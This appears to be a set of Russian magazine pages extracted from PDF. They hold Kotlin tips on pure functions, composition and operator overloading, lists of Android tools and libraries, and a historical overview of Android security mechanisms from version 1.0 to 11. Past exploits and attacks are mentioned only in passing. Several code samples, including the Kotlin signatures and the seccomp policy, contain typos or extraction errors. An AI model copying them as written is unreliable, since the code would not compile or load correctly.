  В функциональном прог раммировании функции язы ка программирования
рассматриваются с точки зрения математичес ких функций, которые пред‐
ставляют собой зависимость одной переменной величины от другой. Такие
функции называются чистыми (pure function). Они имеют ряд ограниче ний
в сравнении с функциями, к которым привыкли программис ты на традици‐
онных языках:
 • чистая функция всегда возвращает зна чение;
 • она не выбрасывает исключений;
 • не изменяет данные за пределами сво ей области видимости;
 • не изменяет свои аргу менты;
 • всегда возвращает одинако вое значение для одних и тех же аргу ментов.

Пример чистой функции на языке Kotlin:


fun division(x: double, y: Double): Double = x / y

Пример нечистой функции:


fun addItems(value: Int, list: MutableList<Int>): List<Int> {
    list.add(value)
    return list
}

Функция из второго примера изменяет один из своих аргументов  (list)
и поэтому не может считаться чистой.
   Сторонники функционального программирования утверждают, что при‐
ложения, написан ные с использованием исключитель но или пре имуществен‐
но чистых функций, всегда более надеж ны, так как приложение состоит
из набора понят ных и простых строительных бло ков, каждый из которых легко
протестировать.
  Для объединения функций применя ется композиция, когда нес колько
функций используются для соз дания новой. Инту итивно ты можешь поп‐
робовать сделать это следующим обра зом:


fun f(x: Int) = x + 1
fun g(x: Int) = 2 * x
println(f(g(2))

Но это неверно. Настоящая композиция должна выполняться как операция
над функциями:


fun f(x: Int) = x + 1
fun g(x: Int) = 2 * x
fun compose(f: (Int) ‐> Int, g: (Int) ‐> Int): (Int) ‐> Int = { x ‐>
f(g(x)) }


val fog = compose(::f, ::g)
println(fog(2))

Предыдущий пример композиции подходит только для типов Int, но его можно
расширить для поддержки любых типов данных:


fun r1(x: Boolean): Int = if(x) 1 else 0
fun r2(x: Int): Boolean = if(x == 0) false else true


fun <T, U, V>compose(f: (U) ‐> V, g: (T) ‐> U): (T) ‐> V = { f(g(it))
 }


val r1of2 = compose<Int, Boolean, Int>(::r1, ::r2)
println(r1of2(2))


Пе регрузка опе рато ров в Kotlin
Code expressivity++ with operator overloading — статья о перегрузке опе рато‐
ров на примере, как бы странно это ни звучало, хора певцов.
  Допустим, у нас есть класс Choir (хор), в который можно добавлять пев‐
цов (Singer):


class Choir {
    private val singers = mutableListOf<Singer>()


    fun addSinger(singer: Singer) {
        singers.add(singer)
    }


    ...
}

Теперь, чтобы добавить певца, необходимо сделать так:


choir.addSinger(singer)

Все понятно и логично, но было бы более привычно делать это так:


choir += singer

Именно для этого нужна перегрузка операто ров. Например, чтобы добавить
оператор +=, достаточ но сделать так:


class Choir {
    private val singers = mutableListOf<Singer>()


    operator fun plusAssign(singer: Singer) {
        singers.add(singer)
    }
}

Обрати внимание на ключевое сло во operator и имя функции (plusAssign).
У каждого оператора есть свое имя (пол ный спи сок), а перегрузка одного
оператора никогда не приводит к перег рузке его «родс твенников». К при‐
меру, перегрузка оператора + не приведет к перегрузке опе ратора ++.
  Перегрузка не всех операторов полезна всег да. В данном слу чае может
быть лучше воспользоваться оператором вхождения (contains):


operator fun contains(s: Singer) : Boolean {
       return singers.contains(s)
}

Благодаря ему можно сделать так:


if (singerMeghan in choir) {
    println("Meghan is a part of the choir!")
}

Перегрузку операторов мож но использовать в функциях‐рас ширениях:


operator fun ViewGroup.plusAssign(other: View) = addView(other)

Теперь добавить View к ViewGroup можно с помощью оператора:


viewGroup += view

Как и в других языках, при перегрузке операто ров в Kotlin следует руководс‐
твоваться простым правилом: краткость не всег да повышает читаемость
кода. Стоит несколько раз подумать перед тем, как применять перегрузку.





             Операторы, поддерживающие перегрузку


             ИНСТРУМЕНТЫ


 • AndroPyTool —  инструмент  для  всестороннего  анализа приложений
   под Android;
 • apkurlgrep — утилита для извлечения URL‐адресов из APK;
 • Luject — инструмент для внедрения биб лиотек в приложения;
 • Decompiler — декомпилятор для VSCode с поддержкой приложений
   под Android.


              БИБЛИОТЕКИ


 • EasyFlipViewPager — эффект перелистывания страниц для ViewPager;
 • Retromock — библиотека для мокинга Retroﬁt;
 • Sandwich — API для обработки успешных и неус пешных сетевых запросов;
 • AGSkeletonLoading — заглушка с ани мацией загрузки;
 • Decorator — библиотека для создания отступов и раз рывов в RecyclerView;
 • TransformationLayout — библиотека для анимированной трансформации
   одних View в другие;
 • Harmony — потокобезопасная реализация SharedPreference;
 • android‐ecosystem‐cheat‐sheet — читшит с информацией о 200 утилитах,
   сервисах, плагинах и библиотеках.
COVERSTORY
БЕЗОПАСНОСТЬ
   ANDROID





    ОТ ПЕРВОЙ ДО ОДИННАДЦАТОЙ
             ВЕРСИИ




Долгое время Android имел славу мед‐
ленной, небезопасной и в целом убогой
ОС, предназначенной для тех, кто не смог
накопить на iPhone. Но так ли это сейчас
и был ли Android на самом деле так плох?          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
В этой статье мы не будем касаться плав‐              zobnin@glc.ru
ности работы интерфейса и возможностей
ОС, но прос ледим за историей едва ли
не самой больной части Android — системы
безопасности.


НАЧАЛО ВРЕМЕН
Понять смысл и назначение защитных механизмов Android проще всего в рет‐
роспективе. А именно — изу чив, как была реализована защита (или ее
отсутствие) в первых версиях ОС и как и зачем она менялась впос ледс твии.
   Итак, Android 1.0 — платформа, выпущенная осенью 2008 года вместе
со смартфоном HTC Dream (T‐Mobile G1). Безопасность обес печивается
пятью ключевыми подсистемами.
   1. PIN-код экрана блокировки для защиты от несанкционированного
физического доступа.
   2. Пе соч ницы (изолиро ванная среда исполнения) для приложений. Каж‐
дое приложение запускается от имени созданно го специально для него поль‐
зователя Linux. Приложение имеет полный контроль над файлами своей
песочницы (/data/data/имя.пакета), но не может получить доступ к сис‐
темным файлам и файлам  дру гих приложений. Единственный  способ
покинуть песочницу — получить права root.
   3. Каждое приложение обя зано ука зывать список нужных для его работы
полномочий  в манифесте.  Пол номочия  поз воляют  использовать  те
или иные системные API (дос туп к камере, микрофону, сети и так далее). Хотя
соблюдение полномочий контролируется на нескольких уровнях, включая
ядро Linux, явно запрашивать их у пользователя не нужно; при ложе ние авто‐
матически получает все перечисленные в манифесте пол номочия, и поль‐
зователю остается либо уста новить приложение, предоставив ему все пол‐
номочия, либо не устанавливать его вовсе.
   Контроль доступа на осно ве полномочий не распространяется на карты
памяти и USB‐накопители. Они используют файловую систему FAT, которая
не позволяет назначить права дос тупа к фай лам. Любое приложение может
читать содержимое всей карты памяти.
   4. Приложе ния дол жны быть подписаны ключом разработчика. Во время
установки новой версии приложения система сверяет цифровые подписи
старой и новой версий приложения и не допус кает установку, если они
не совпадают. Такой подход позволяет защитить пользователя от фишинга
и кражи данных, когда троян прикидывается легитимным приложением и пос‐
ле «обновления» получает дос туп к файлам ори гинального при ложе ния.
   5. Язык Java и виртуальная машина обеспечивают защиту от многих
типов атак, перед которыми уязвимы при ложения на небезопасных языках,
таких как C и C++. Переполнение буфера или повторное использование
освобожденной памяти в Java невозможны в принципе.
  В то же время значительная часть операционной системы, включая сис‐
темные сервисы, виртуальную машину, мультимедийные библиоте ки, систему
рендеринга графики, а также все сетевые подсистемы, написана на тех
самых небезопасных C и C++ и работа ет с пра вами root. Уязвимость в одном
из этих компонен тов может быть использована для получения пол ного кон‐
троля над ОС или выполнения DoS‐ата ки. HTC Dream был «взломан» благода‐
ря тому, что сервис Telnet, предус тановленный на смартфон, работал с пра‐
вами root. Все, что нужно было сделать, — это най ти способ его запус тить,
а затем к смартфону можно было подключиться по сети и получить шелл‐дос‐
туп с правами суперполь зователя.
   Если же говорить о стандартных приложениях, то они хоть и не имели прав
root и работали под защитой виртуальной машины в собс твенной песочнице,
так или иначе обладали очень широкими возможностями, свойственными
десктопным операционным системам. При наличии нужных прав стороннее
приложение могло сделать очень многое: про читать списки СМС и звонков,
прочитать любые файлы на карте памяти, получить список установленных
приложений, работать в фоне неограниченное время, выводить графику
поверх окон других при ложений, получать информацию практически обо всех
системных событиях (установка приложения, вклю чение‐выключение экрана,
звонок, подключение зарядного устройства и многое дру гое).
   Строго говоря, все эти API не были уяз вимос тями в прямом смысле слова.
Наоборот, они открывали широкие возможности для программистов  и,
как следствие, поль зователей. Но если в 2008‐м эти воз можнос ти не соз‐
давали особых проб лем, поскольку рынок смартфонов был ориентирован
на энтузиастов и бизнесменов, то уже через нес коль ко лет, когда смартфоны
получили распространение среди всех групп населения, стало понятно, что
приложения необходимо огра ничивать в возможностях.


ПОЛНОМОЧИЯ
Есть два способа ограничить приложения в правах и не дать им влиять
на систему и пользовательские данные:
 1. Урезать возможности всех приложений до минимума, как это было сде‐
   лано в J2ME.
 2. Позволить пользователю контролировать дос тупные приложе нию воз‐
  можности (путь iOS).

Android, несмотря на мощную систему раз деления пол номочий внутри ОС,
не позволял ни того, ни дру гого. Первые намеки на систему гранулярного
контроля полномочий появились только в Android 4.3 вместе со скрытым раз‐
делом настроек App Ops.





                Скрытое меню App Ops в Android 4.3

С помощью этих настро ек пользователь мог отоз вать у приложения любые
доступные ему полномочия по отдель ности. Однако назвать эту сис тему
удобной и дружелюбной пользователю нельзя: управле ние разрешениями
было чересчур гранулярным, приходилось ориентироваться сре ди десятков
разрешений, смысл которых час то оставался непонятен. При этом отзыв
любого разрешения мог привести (и час то приводил) к падению приложения,
так как в Android просто не было API, который бы позволил программис ту
понять, имеет его приложение раз решение на выполнение того или иного
действия или нет. В итоге систему App Ops удалили из Android уже в вер‐
сии 4.4.2, и только в Android 6 ей на смену пришла сущес твующая до сих пор
система полномочий.
  В этот раз инженеры Google пошли другим путем и объ еди нили смежные
полномочия, получив в итоге семь метаполномочий, которые могут быть зап‐
рошены прямо во время работы приложения. В основе системы лежал новый
API, позволивший программистам проверять дос тупные приложе нию пол‐
номочия и запрашивать их, ког да нужно.
  Побочным эффектом такого подхода стала... бес полезность новой сис‐
темы. Дело в том, что она работала исключитель но для при ложе ний, соб‐
ранных под Android 6.0 и выше. Разработчик приложения мог указать в пра‐
вилах сборки директиву targetSdkVersion 22 (то есть Android 5.1), и его
приложение продол жило бы получать все полномочия в автоматичес ком
режиме.
   Google была вынуждена реализовать систему именно таким образом, что‐
бы сохранить совместимость со старым софтом. По‐нас тоящему сис тема
начала действовать только спус тя два года, когда Google вве ла тре бование
минимального SDK в Google Play, то есть прос то запретила публиковать при‐
ложения, собранные для уста ревших версий ОС. Окончательно решили воп‐
рос только в Android 10: стало возможно отзы вать полномочия у софта, соб‐
ранного для Android 5.1 и ниже.
  В Android 11 система полномочий была рас ширена и теперь позволяет
предоставлять разрешение на ту или иную операцию только на один раз.
Как только приложение будет свернуто, оно потеря ет разрешение, и его при‐
дется запрашивать снова.





             Одноразовые раз решения в Android 11


ОГРАНИЧЕНИЯ
Система управления разрешениями — только часть решения проблемы. Вто‐
рая часть — запреты на использование опасных API. Можно дол го спорить,
стоит  ли  позволять  сторонним  приложениям  получать  IMEI  телефона
с помощью разрешений, или необходимо запретить делать это вовсе.
Для Google, входящей в эпоху тотального помешательства на прайваси, ответ
был очевиден.
  Несмотря на то что компания и рань ше вводила запреты на исполь‐
зование тех или иных API (мож но вспомнить, например, запрет на включение
режима полета и подтверждение отправки СМС на короткие номера в Android
4.2), активные боевые действия начались только в 2017 году.
  Начиная с восьмой версии Android скрывает многие идентификаторы
устройства от приложений и других устройств. Android ID (Settings.Secure.
ANDROID_ID) — уникальный идентификатор Android теперь различен для каж‐
дого установ ленного приложения. Серий ный номер устройства (android.os.
Build.SERIAL) недоступен приложениям, собранным для Android 8 и выше.
Содержимое переменной net.hostname пусто, а DHCP‐клиент никогда
не посылает хостнейм DHCP‐серверу. Стали недоступны некоторые сис‐
темные переменные, например ro.runtime.ﬁrstboot (вре мя последней заг‐
рузки).
  С Android 9 приложения больше не могут прочитать серийный номер
устройства без пол номочия READ_PHONE_STATE. В Android 10 появилось огра‐
ничение на доступ к IMEI и IMSI. Что бы прочитать эту информацию, теперь
требуется разрешение READ_PRIVILEGED_PHONE_STATE, недоступное сто‐
ронним приложениям.
  Для получения MAC‐адреса Bluetooth в Android 8 и выше требуется раз‐
решение LOCAL_MAC_ADDRESS, а MAC‐адрес Wi‐Fi рандомизируется при про‐
верке доступных сетей (чтобы избежать трекинга пользователей, например
покупателей в торговых центрах).
  В Android 9 Google пошла намного дальше и запретила использовать
камеру, мик рофон и любые сенсоры, пока приложение находится в фоне
(оставив возможность использовать камеру и микрофон «видимым сер‐
висам» — foreground service). В Android 10 к этим ограничениям добавился
запрет на доступ к местополо жению в фоне (теперь для этого нужно раз‐
решение ACCESS_BACKGROUND_LOCATION) и запрет на чте ние буфера обмена
в фоне (нужно разрешение READ_CLIPBOARD_IN_BACKGROUND).
  Еще одно важное нововведение Android 9 — полный запрет на исполь‐
зование HTTP без TLS (то есть без шифрования) для всех при ложе ний, соб‐
ранных для новой версии Android. Это огра ничение тем не менее можно
обойти, если указать в файле нас троек безопас ности сети (network_securi‐
ty_config.xml) список раз решенных доменов.
   Android 10 ввел запрет на запуск активнос тей (по сути — запуск приложе‐
ний) фоновыми приложениями. Исклю чения сделаны для bound‐сервисов,
таких как Accessibility и сервисы автозаполнения. При ложения, использующие
разрешение  SYSTEM_ALERT_WINDOW,  и  при ложения,  получающие  имя
активности в системном PendingIntent, тоже могут запускать активнос ти
в фоне. Также приложения теперь не могут запус кать бинарные файлы
из собственного приватного  катало га. Это уже привело  к проблемам
в работе популярного приложения Termux.
  С Android 11 приложения больше не могут получить прямой доступ к карте
памяти (внутренней или внешней) с помощью разрешений READ_EXTER‐
NAL_STORAGE и WRITE_EXTERNAL_STORAGE. Вместо этого следует исполь‐
зовать либо личный каталог приложения внут ри /sdcard/Android (он соз‐
дается автоматически и не требует раз решений), либо Storage Access Frame‐
work, не допускающий доступ к данным других приложений.
  Интересно, что Google огра ничивает сторонние приложения не только
средствами операционной системы. В конце 2018 года в Google Play появи‐
лось требование, гласящее, что все приложения, использующие раз решения
на чтение СМС и журнала звонков, должны отно ситься к одному из разрешен‐
ных типов приложений и в обязательном порядке проходить ручную пре моде‐
рацию. В результате из маркета удалили многие полезные инстру менты,
авторы которых просто не смог ли обосновать перед Google необходимость
использовать те или иные разрешения.


ШИФРОВАНИЕ ДАННЫХ
Права доступа и другие огра ничения времени исполне ния — хорошая защита
до тех пор, пока злоумышленник не получит физичес кий дос туп к устройству.
Но что будет, если забытый пользователем смартфон попадет в руки под‐
готовленного хакера? Многие устройства во времена первых версий ОС име‐
ли уязвимости в загрузчике или не блокировали его вовсе. Поэтому снять
дамп NAND‐памяти было про ще прос того.
  Для борьбы с этой проб лемой в Android 3.0 появи лась встроенная фун‐
кция шифрования данных, основанная на про веренном годами и сотнями
тысяч пользовате лей модуле Linux‐ядра dm‐crypt. С Android 5 эта функция
стала обязательной, то есть Google потребова ла включить ее для всех
устройств с поддержкой хардварного ускорения шифрования (это в первую
очередь 64‐битные процессоры ARM).





                  Включаем шифрование данных

Система шифрования была дос таточно стандартной. Раздел userdata шиф‐
ровался с помощью модуля dm‐crypt алгорит мом AES‐128 в режиме CBC
с привлечением функции ESSIV:SHA256 для получения векторов инициали‐
зации (IV). Ключ шифрования был защищен с помощью KEK‐ключа, который
мог быть получен из PIN‐кода с помощью прогонки через функцию scrypt
или сгенерирован случайным обра зом и сохранен в TEE. При этом, если
пользователь купил смар тфон на базе Android 5.0 с активированным по умол‐
чанию шифрованием и затем уста новил PIN‐код, последний также исполь‐
зовал ся для генерации KEK.
  Функция scrypt для получения ключа из PIN‐кода используется с Android
4.4. Она заменила ранее применявшийся  алгоритм PBKDF,  уязвимый
для подбора на GPU (шестизначный цифровой PIN за десять секунд, шес‐
тизначный знаковый — четыре часа с помощью hashcat), тогда как scrypt,
по заявлению создателей, увеличивал время подбора примерно в 20 000 раз
и вообще не подходил для GPU из‐за высоких требований к памяти.
  К сожалению, при всех ста раниях Google система полнодискового шиф‐
рования (FDE — Full Disk Encryption) продолжала страдать от ряда концепту‐
альных недостатков.
 1. FDE не позволяло использовать разные ключи шифрования для разных
   областей данных и пользователей. Например, зашифровать раз дел An‐
   droid for Work с помощью корпоративного клю ча предпри ятия или рас‐
  шифровать критичес кие для основной функциональности смартфона дан‐
  ные без запроса пароля пользователя.
 2. Посекторное шифрование сводило на нет все оптимизации, реализован‐
  ные на уров не драйверов файловых систем. Устройство практически неп‐
   рерывно выпол няло расшифровку секторов и зашифровывало их вновь,
  модифицируя содержимое раз дела. Поэтому с FDE всегда заметно
   падала производительность и сокращалось время автономной работы
   устройства.
 3. FDE не поддерживало проверку подлинности содержимого секторов. Их
  слишком много, и среди них время от времени появляются сбойные,
   переназначаемые контроллером в резервную область.
 4. Криптографическая схема AES‐CBC‐ESSIV была уязвимой к утечке дан‐
   ных, так как допускала определение точки их изменения. Она позволяла
   выполнять атаки подмены и перемещения.

Решением стала система пофайлового шифрования в Android 7 (FBE — File‐
Based Encryption). Она использует функцию шифрования файловых сис тем
ext4 и F2FS для раздельного шифрования каж дого фай ла по алгоритму AES,
но уже в другом режиме — XTS. Этот режим разрабаты вался специально
для шифрования блоч ных устройств и не име ет типичных для режима CBC
уязвимостей. В частности, XTS не поз воляет определить точку изме нения
данных, не подвержен утечке данных, устойчив к атакам подмены и переме‐
щения.
   Вплоть до последнего времени Google позволяла производителям смар‐
тфонов использовать любой механизм шифрования, но с Android 10 FBE ста‐
ло обязательным. Более того, начиная с Android 9 шифрование обя зательно
не только для устрой ств с хардварной поддержкой шифрования, но и вооб ще
для всех устройств.
   Такая  возможность  появилась благодаря  раз работанному  в  Google
механизму шифрования Adiantum. Он базиру ется на примене нии быстрой
хеш‐функции   NH,   алго ритме   аутентифика ции   сооб щений   (MAC)
Poly1305 и потоковом шифре XChaCha12. В тес тах на процессоре ARM Cor‐
tex‐A7 Adiantum показывает пятикратное превосходс тво в скорости шиф‐
рования над AES‐256‐XTS.


ДОВЕРЕННАЯ СРЕДА ИСПОЛНЕНИЯ
Важным новшеством сис темы шифрования Android 5 стала возможность хра‐
нить ключ шифрования в доверенной среде исполнения (Trusted Execution En‐
vironment — TEE). Речь идет о выделен ном микрокомпьютере внутри мобиль‐
ного чипа или рядом с ним. Он имеет собственную ОС и отве чает исклю‐
чительно за шифрование данных и хранение клю чей шифрования. Доступ
к такому микро‐ПК име ет лишь небольшой сервис внутри основной системы,
так что компрометация системы не приводит к утечке самих ключей.
  Наиболее известная реализация TEE — TrustZone, которая используется
в чипсетах Qualcomm (ее, кста ти, уже взламыва ли). Другие производители
могут взять собственные. Например, в смартфо нах Samsung это реализация
TEE под управлением операционной системы Kinibi, разработанной компани‐
ей Trustsonic (Samsung Galaxy S3–S9), либо сис темы TEEGRIS, за авторством
инженеров самой Samsung (Samsung Galaxy S10 и выше).





                       TrustZone в варианте Samsung

Смартфоны линейки Pixel (начиная с Pixel 3/3XL) используют выделенный чип
Titan M, который разработа ла и производит сама Google. Это мобильная вер‐
сия серверного чипа Titan, в ней в том числе хранятся ключи шифрования
и счетчик откатов, который использует система доверенной загрузки Veriﬁed
Boot (о ней чуть позже), а также реализова на функция Android Protected Con‐
ﬁrmation, позволяющая математичес ки доказать, что пользователь действи‐
тельно увидел диалог подтверждения и что ответ на этот диалог не был
перехвачен и изменен. Чип имеет прямую электрическую связь с боковы ми
клавишами смартфона и блокирует их при попытках взлома.
   Titan M — своего рода ана лог чипа Secure Enclave, который Apple уже нес‐
колько лет пре дустанавливает в собственные смартфоны. Благодаря тому что
Titan M — это выделен ный микрокомпь ютер (на базе ARM Cortex‐M3), не свя‐
занный с основным процессором, он устойчив к атакам типа Rowhammer,
Spectre и Meltdown.





                                        Titan M


ДОВЕРЕННАЯ ЗАГРУЗКА
Еще в Android 4.4 Google реализова ла механизм Veriﬁed Boot. На каждом эта‐
пе загрузки «первичный загрузчик → вто ричный → aboot → ядро Linux → сис‐
тема Android» опе рационная система проверяет целостность сле дующего
компонента (загрузчики по цифровым подписям, ядро по контрольной сумме,
систему по контроль ной сумме ФС) и может предпринять дей ствия, если
компонент был изменен.
  Долгое время механизм находился в стадии развития и только с выпуском
Android 7 научился полагать ся на хардварное хра нилище ключей (TEE) и зап‐
рещать загрузку при компромета ции одного из компонентов (если этого
захочет производитель устройства).
  Начиная с Android 8 в сос таве Veriﬁed Boot появилась официальная реали‐
зация защиты от даунгрейда, когда система явно зап рещает установку старых
версий прошивок.
  Даунгрейд опасен тем, что может быть исполь зован для получения дос‐
тупа  к смартфону с помощью «воз вра щения старых багов». Допустим,
человек украл телефон, понял, что он зашифрован, запаролен, а загрузчик
заблокирован. Кастомную прошивку установить не получится (не совпадают
сертификаты), но можно откатить смартфон к ста рой версии официальной
прошивки, в которой был баг, позволяющий обойти блокировщик экрана
(такой был в прошив ке Samsung, например), и с его помощью получить дос‐
туп к содержимому смартфона.





  Метаданные Veriﬁed Boot вклю чают в себя Rollback Index для защиты
  от отката и хеш‐суммы раз делов



                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
      БЕЗОПАСНОСТЬ
           ANDROID
            ОТ ПЕРВОЙ ДО ОДИННАДЦАТОЙ ВЕРСИИ





ЗАЩИТА ОТ СРЫВА СТЕКА
Шифрование данных и режим доверенной загрузки спасут от злоумышленни‐
ка, который не сможет обойти экран блокировки и попытается снять дамп
с уже выключенного устройства или загрузить устройство с альтернативной
прошивкой. Но они не защитят от экс плуата ции уязвимостей в уже работа‐
ющей системе.
   Уязвимости в ядре, драйверах и системных компонентах зачастую поз‐
воляют получить права root. Поэтому Google занялась укрепле нием этих ком‐
понентов почти сразу после релиза первой версии Android.
  В Android 1.5 системные компоненты были переведены на использование
библиотеки safe‐iop, реализующей функции безопас ного выпол нения ариф‐
метических операций над целыми числами (защита от  integer overﬂow).
Из OpenBSD была позаимствована реализация функции dmalloc, затрудня‐
ющая атаки с задействованием двойного осво бождения памяти и атаки сог‐
ласованности чанков, а также функция calloc с проверкой на воз можность
целочисленного переполнения во время операции выделения памяти.
   Весь низкоуровневый код Android с версии 1.5 собирается с применением
механизма компилятора GCC ProPolice для защиты от срыва сте ка на этапе
компиляции. Начиная с версии  2.3 в коде задей ствованы «железные»
механизмы защиты от срыва стека (бит No eXecute (NX), доступный с ARMv6).
  В Android 4.0 Google внедрила в Android технологию Address space layout
randomization (ASLR), которая позволяет расположить в адресном пространс‐
тве процесса образ исполняемого файла, подгру жаемых биб лиотек, кучи
и сте ка случайным образом. Благодаря этому эксплу атация многих типов атак
существенно усложняется, так как ата кующему приходится угадывать адреса
перехода для выпол нения ата ки. Кроме того, с версии 4.1 Android собирают
с использованием механизма RELRO (Read‐only relocations), который поз‐
воляет защитить системные компоненты от атак, основанных на перезаписи
секций загруженного в память ELF‐файла. С Android 8 поддержка ASLR также
распространяется на ядро. В Android 4.2 появилась поддержка механизма
FORTIFY_SOURCE, позволя ющего отследить перепол нение буфера в функциях
копирования памяти и строк.
  Начиная с ядра Linux 3.18 в Android включен софтверный вариант функции
PAN (Privileged Access Never), защищающий от пря мого дос тупа к памяти про‐
цессов из режима ядра. Хотя само ядро обычно не использует эту воз‐
можность, некорректно написанные драйверы могут это делать, что при водит
к появлению уязвимостей.
  Все ядра 3.18 и выше также включают функцию Post‐init read‐only memory.
Она помечает участки памяти, которые были дос тупны для записи во вре мя
инициализации ядра, как read‐only уже пос ле инициализации.
  Начиная с восьмой версии Android собира ют с применением технологии
Control Flow  Integrity (CFI), предназначенной для борьбы с экс плоитами,
использующими технику ROP (Return Oriented Programming). При включении
CFI компилятор строит граф вызовов функций и встра ивает код сверки с этим
графом перед каждым вызовом функции. Если вызов происходит по откло‐
няющемуся от графа адресу, приложение завершается.
  В Android 9 использование CFI расширилось и покрывает медиафрей‐
мворки, а также стек NFC и Bluetooth. В Android 10 поддержка была реали‐
зована для самого ядра.





          Код вызова функции с отклю ченным и включенным CFI

Похожим образом работа ет технология Integer Overﬂow Sanitization (IntSan),
предназначенная для защиты от целочисленно го переполнения. Компилятор
встраивает в результиру ющий код приложений функции проверки — подтвер‐
дить, что исполняемая арифметическая операция не вызовет переполнения.
  Впервые технология была использована в Android 7 для защиты медиасте‐
ка, в котором обнаружи ли целый комплекс удаленных уязвимостей Stagefright.
В Android 8 она также используется для защиты компонентов libui, libnl, libme‐
diaplayerservice,  libexif,  libdrmclearkeyplugin и  libreverbwrapper. В  Android
10 проверками удалось покрыть 11 медиакодеков и стек Bluetooth. По словам
разработчиков, уже существо вавшие в Android 9 про верки позволили нейтра‐
лизовать 11 различных уязвимостей.
  В Android 7 медиастек был разделен на множество независимых сер‐
висов, каждый из которых имеет только необ ходимые ему полномочия. Идея
здесь в том, что уязвимос ти Stagefright были найдены в коде медиакодеков,
которые теперь не имеют дос тупа к интернету, так что не могут быть проэкс‐
плуатированы удаленно. Подробнее об этом можно почитать в блоге Google.
  Начиная с Android 10 медиакодеки используют аллокатор памяти Scudo,
затрудняющий атаки типа use‐after‐free, double‐free и перепол нение буфера.





                      Раз деленный MediaServer


SELINUX
Еще один большой шаг в сто рону защиты от возможных уязвимостей в сис‐
темных компонентах ОС — технология SELinux.
   SELinux разработана Агентством национальной безопасности США и уже
давно используется во многих корпоративных и настольных дистрибутивах
Linux для защиты от самых раз ных видов атак. Одно из основных применений
SELinux — ограничить приложениям доступ к ресурсам ОС и данным дру гих
приложений.
  С помощью SELinux можно, например, сделать так, чтобы веб‐сервер
имел доступ только к определенным файлам и диапазону портов, не мог
запускать бинарные файлы, помимо заранее оговоренных, и имел ограничен‐
ный доступ к системным вызовам. По сути, SELinux запирает приложение
в песочницу, серьезно огра ничивая воз можнос ти того, кто сможет его взло‐
мать.
   Вскоре после появления на свет Android раз работчики SELinux начали
проект SEAndroid. Его суть — перенес ти систему в мобильную ОС и раз‐
работать правила SELinux для защиты ее компонентов. Начиная с вер‐
сии 4.2 наработки это го про екта входят в сос тав Android, но на первых порах
(версия  4.2–4.3)  они  использовались  исклю чительно,  чтобы  собирать
информацию о поведении компонентов системы (а затем составить пра‐
вила). В версии 4.4 Google перевела систему в активный режим, но с мягкими
ограничениями для нескольких системных демонов (installd, netd, vold и zy‐
gote). На полную же катушку SELinux заработал толь ко в Android 5.
  В Android 5 предусмотрено более 60 доменов SELinux (проще говоря —
правил ограничений) почти для каж дого системного компонента, начиная
с первичного процесса init и заканчивая пользовательскими приложе ниями.
На практике это означает, что многие векторы атак на Android, которые
в прошлом исполь зовались как самими пользователями для получения root,
так и разного рода малварью, больше не акту аль ны.
   Так, уязвимость CVE‐2011‐1823, имевшая место во всех версиях Android
до 2.3.4 и позволяющая вызвать memory corruption в демоне vold, а далее
передать управле ние шеллу с правами root (эксплоит Gingerbreak), не мог‐
ла бы быть использована, будь она найдена в Android 5 — здесь, согласно
правилам SELinux, vold не имеет пра ва запус кать другие бинарные файлы. То
же самое справедливо и для уяз вимости CVE‐2014‐3100 в Android 4.3, поз‐
воляющей вызвать переполнение буфера в демоне keystore, и 70% других
уязвимостей.
   SELinux значительно снижает риск, что злоумышленник захватит устрой‐
ство, проэксплуатировав уязвимос ти в низкоуровневых компонентах сис темы
(многочисленных написанных на С и С++ демонах, исполня емых от имени
root), но в то же время затрудня ет получение root, так сказать, «для себя».
Более того, отныне права root сами по себе не гарантиру ют полного контроля
над системой, так как для SELinux нет разницы между обычным юзе ром
и суперпользователем.





           Контексты SELinux нативных демонов и при ложе ний


SECCOMP-BPF
Seccomp — еще одна технология ядра Linux, позволя ющая ограничить список
доступных приложению  (и в пер спективе опасных) системных вызовов.
С помощью seccomp можно, например, запретить приложе нию использовать
системный вызов execve, который час то применяют эксплоиты, или заб‐
локировать  системный  вызов   listen,  дающий  возможность  повесить
на сетевой порт бэкдор. Именно seccomp лежит в основе системы изоляции
вкладок в браузере Chrome для Linux.
   Технология исполь зовалась в Android с седь мой версии, но применялась
исключительно к системным компонентам. В Android 8 seccomp‐фильтр был
внедрен в Zygote — процесс, который порождает процес сы всех установ‐
ленных в систему приложений.
   Разработчики проанализирова ли, какие системные вызовы нужны для заг‐
рузки ОС и работы большинства приложений, а затем отсекли лишние. В ито‐
ге    в    черный    список    попали    17    системных    вызовов
из 271 на ARM64 и 70 из 364 на ARM.
  Пример использования seccomp в сервисе MediaExtractor:


static const char kSeccompFilePath[] =
    "/system/etc/seccomp_policy/mediaextractor‐seccomp.policy";


int MiniJail()
{
    struct minijail *jail = minijail_new();
    minijail_no_new_privs(jail);
    minijail_log_seccomp_filter_failures(jail);
    minijail_use_seccomp_filter(jail);
    minijail_parse_seccomp_filters(jail, kSeccompFilePath);
    minijail_enter(jail);
    minijail_destroy(jail);
    return 0;
}

Файл mediaextractor‐seccomp.policy:


ioctl: 1
futex: 1
prctl: 1
write: 1
getpriority: 1
mmap2: 1
close: 1
10munmap: 1
dupe: 1
mprotect: 1
getuid32: 1
setpriority: 1





  Краш системы при попытке выполнить неразрешенный системный вызов


GOOGLE PLAY PROTECT
В феврале 2012 года Google включилась в борьбу со зловредны ми приложе‐
ниями: начал работать сервис онлайн‐проверки приложений Bouncer. Он
запускал каждое публику емое в Google Play приложение в эму ляторе и про‐
гонял через многочисленные тес ты в поисках подоз рительного поведения.
  В ноябре того же года появился сервис онлайн‐проверки софта на вирусы
прямо на устройстве пользователя (Verify Apps). Изна чально он работал толь‐
ко на 4.2, но к июлю 2013‐го был интегрирован в пакет Google Play Services
и стал доступен для всех устройств от 2.3. С апреля 2014‐го проверка
выполянется не только на эта пе установки приложения, но и по расписанию,
а с 2017 года за проверками можно следить через интерфейс системы
под названием Google Play Protect (раздел «Безопасность»).
  Вместе с новым интерфейсом Google вытащила наружу еще несколько
индикаторов работы антивируса. Версия Play Store для Android 8 и выше
показывает статус проверки приложения на стра нице приложе ния, а также
выводит красивый зеленый щит с надписью «Все хорошо, парень, ты
защищен» в списке установленных приложений.





                     Google Play Protect в Android 8

Проблема  здесь  только  в  том,  что  сог ласно  тесту  антивирусов
за март 2020 года Google Play Protect занима ет пос леднее место в рейтинге,
обнаружив  только 47,8% новых вирусов  (не  старше четырех  недель).
